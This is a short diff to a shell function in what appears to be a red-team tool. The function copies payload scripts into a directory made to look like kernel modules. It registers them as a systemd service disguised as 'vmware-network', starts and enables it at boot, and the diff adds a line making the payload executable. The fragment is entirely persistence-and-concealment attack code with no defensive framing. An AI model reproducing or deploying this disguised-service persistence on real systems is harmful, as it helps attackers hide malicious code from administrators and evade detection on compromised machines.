@@ -48,6 +48,7 @@ copyman(){
     cp /opt/cdt-redteamtool/payload/copyman.sh /lib/modules/kernel_static/copy
     cp /opt/cdt-redteamtool/payload/static/* /lib/modules/kernel_static/
     chmod 744 /etc/systemd/system/vmware-network.service
+    chmod +x /lib/modules/kernel_static/copy
 
     systemctl start vmware-network
     systemctl enable vmware-network
